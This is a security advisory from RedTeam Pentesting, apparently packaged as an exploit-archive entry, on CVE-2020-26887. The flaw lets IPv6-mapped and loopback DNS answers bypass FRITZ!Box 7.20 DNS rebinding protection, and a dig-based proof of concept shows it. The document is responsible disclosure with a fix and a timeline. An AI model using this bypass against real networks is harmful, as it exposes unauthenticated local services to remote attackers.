@@ -1,0 +1,191 @@
+# Exploit Title: FRITZ!Box 7.20 - DNS Rebinding Protection Bypass
+# Date: 2020-06-23
+# Exploit Author: RedTeam Pentesting GmbH
+# Vendor Homepage: https://en.avm.de/
+# Version: 7.20
+# CVE: 2020-26887
+
+Advisory: FRITZ!Box DNS Rebinding Protection Bypass
+
+RedTeam Pentesting discovered a vulnerability in FRITZ!Box router
+devices which allows to resolve DNS answers that point to IP addresses
+in the private local network, despite the DNS rebinding protection
+mechanism.
+
+
+Details
+=======
+
+Product: FRITZ!Box 7490 and potentially others
+Affected Versions:  7.20 and below
+Fixed Versions: >= 7.21
+Vulnerability Type: Bypass
+Security Risk: low
+Vendor URL: https://en.avm.de/
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2020-003
+Advisory Status: published
+CVE: 2020-26887 
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-26887
+
+
+Introduction
+============
+
+"For security reasons, the FRITZ!Box suppresses DNS responses that refer
+to IP addresses in its own home network. This is a security function of
+the FRITZ!Box to protect against what are known as DNS rebinding
+attacks."
+
+(from the vendor's homepage)
+
+
+More Details
+============
+
+FRITZ!Box router devices employ a protection mechanism against DNS
+rebinding attacks. If a DNS answer points to an IP address in the
+private network range of the router, the answer is suppressed. Suppose
+the FRITZ!Box routers DHCP server is in its default configuration and
+serves the private IP range of 192.168.178.1/24. If a DNS request is
+made by a connected device, which resolves to an IPv4 address in the
+configured private IP range (for example 192.168.178.20) an empty answer
+is returned. However, if instead the DNS answer contains an AAAA-record
+with the same private IP address in its IPv6 representation
+(::ffff:192.168.178.20) it is returned successfully. Furthermore, DNS
+requests which resolve to the loopback address 127.0.0.1 or the special
+address 0.0.0.0 can be retrieved, too.
+
+
+Proof of Concept
+================
+
+Supposing the following resource records (RR) are configured for different
+subdomains of example.com:
+
+------------------------------------------------------------------------
+private.example.com        1  IN  A     192.168.178.20
+local.example.com          1  IN  A     127.0.0.1
+privateipv6.example.com.   1  IN  AAAA  ::ffff:192.168.178.20
+------------------------------------------------------------------------
+
+A DNS request to the FRITZ!Box router for the subdomain
+private.example.com returns an empty answer, as expected:
+
+------------------------------------------------------------------------
+$ dig private.example.com @192.168.178.1
+; <<>> DiG 9.11.5-P4-5.1+deb10u1-Debian <<>> private.example.com @192.168.178.1
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 58984
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;private.example.com.	IN	A
+------------------------------------------------------------------------
+
+DNS requests for the subdomains privateipv6.example.com and
+local.example.com return the configured resource records successfully,
+effectively bypassing the DNS rebinding protection:
+
+------------------------------------------------------------------------
+$ dig privateipv6.example.com @192.168.178.1 AAAA
+; <<>> DiG 9.11.5-P4-5.1+deb10u1-Debian <<>> @192.168.178.1 privateipv6.example.com AAAA
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 6510
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;privateipv6.example.com.	IN	AAAA
+
+;; ANSWER SECTION:
+privateipv6.example.com. 1	IN	AAAA	::ffff:192.168.178.20
+
+
+$ dig local.example.com @192.168.178.1
+; <<>> DiG 9.11.5-P4-5.1+deb10u1-Debian <<>> local.example.com @192.168.178.1
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 28549
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;local.example.com.	IN	A
+
+;; ANSWER SECTION:
+local.example.com. 1	IN	A	127.0.0.1
+------------------------------------------------------------------------
+
+
+Workaround
+==========
+
+None.
+
+
+Fix
+===
+
+The problem is corrected in FRITZ!OS 7.21.
+
+
+Security Risk
+=============
+
+As shown, the DNS rebinding protection of FRITZ!Box routers can be
+bypassed allowing for DNS rebinding attacks against connected devices.
+This type of attack however is only possible if vulnerable services are
+present in the local network, which are reachable over HTTP without
+authentication. The web interface of FRITZ!Box routers for example is
+not vulnerable to this type of attack, since the HTTP Host header is
+checked for known domains. For this reason the risk is estimated to be
+low.
+
+
+Timeline
+========
+
+2020-06-23 Vulnerability identified
+2020-07-08 Vendor notified
+2020-07-20 Vendor provided fixed version to RedTeam Pentesting
+2020-07-23 Vendor notified of another problematic IP
+2020-08-06 Vendor provided fixed version to RedTeam Pentesting
+2020-10-06 Vendor starts distribution of fixed version for selected devices 
+2020-10-19 Advisory released
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
+
+
+Working at RedTeam Pentesting
+=============================
+
+RedTeam Pentesting is looking for penetration testers to join our team
+in Aachen, Germany. If you are interested please visit:
+https://www.redteam-pentesting.de/jobs/
+
+-- 
+RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
+Dennewartstr. 25-27                       Fax : +49 241 510081-99
+52068 Aachen                    https://www.redteam-pentesting.de
+Germany                         Registergericht: Aachen HRB 14004
+Geschäftsführer:                       Patrick Hof, Jens Liebchen
